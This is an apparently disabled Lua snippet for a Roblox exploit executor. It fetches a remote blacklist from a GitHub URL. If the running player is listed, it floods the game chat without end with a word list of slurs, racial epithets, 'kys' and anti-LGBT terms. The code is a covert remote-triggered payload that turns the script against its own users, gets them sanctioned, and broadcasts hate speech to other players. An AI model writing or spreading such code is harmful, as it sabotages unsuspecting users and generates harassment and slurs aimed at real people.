--Reworking on this

--[[

local http_request = syn and syn.request or request;
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local BlacklistUsers = http_request({Url = "https://raw.githubusercontent.com/SmokeXDev/SmokeUsers/main/Blacklist.json", Method = 'GET'}).Body;
local blacklisted = game:GetService("HttpService"):JSONDecode(BlacklistUsers)
local BadWords = {
    "gay",
    "lesbian",
    "retard",
    "noob",
    "clown",
    "no life",
    "wizard",
    "report",
    "father",
    "mother",
    "dumb",
    "stupid",
    "cringe",
    "parent",
    "kid",
    "ugly",
    "child",
    "trash",
    "bozo",
    "kys",
    "die",
    "killyou",
    "loser",
    "black",
    "white",
    "negro",
    "nivver",
    "negar",
    "bad",
    "worst",
    "fat",
    "hack",
    "exploit",
    "cheat",
    "download",
    "yt",
    "trans",
    "lgbt"
}

for playerName, kickInfo in pairs(blacklisted) do
    local blacklistedplr = Players:FindFirstChild(playerName)
    if blacklistedplr == Players.LocalPlayer then
        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
            while true and task.wait() do
                for _, BadWord in ipairs(BadWords) do
                    game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(BadWord)
                end
            end
        elseif game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService then
            while true and task.wait() do
                for _, BadWord in ipairs(BadWords) do
                    ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(BadWord, "All")
                end
            end
        end        
    end
end

]]--